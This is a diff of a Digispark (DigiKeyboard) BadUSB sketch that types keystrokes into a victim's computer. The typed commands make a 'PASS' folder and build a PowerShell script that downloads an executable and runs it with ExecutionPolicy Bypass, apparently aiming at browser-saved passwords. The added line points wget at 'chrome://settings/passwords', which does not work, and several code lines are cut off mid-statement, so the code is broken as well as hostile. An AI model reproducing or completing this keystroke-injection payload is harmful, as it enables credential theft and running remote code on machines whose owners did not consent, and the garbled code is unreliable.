@@ -18,7 +18,7 @@ void setup() {
   DigiKeyboard.println("cd Downloads & mkdir PASS & cd PASS"
   DigiKeyboard.
   DigiKeyboard.delay(
-  DigiKeyboard.print(F("echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; wget LINK_TO_EXE -OutFile a.exe > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
+  DigiKeyboard.print(F("echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; wget chrome://settings/passwords -OutFile a.exe > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
   DigiKeyboard.print(F("powershell"));
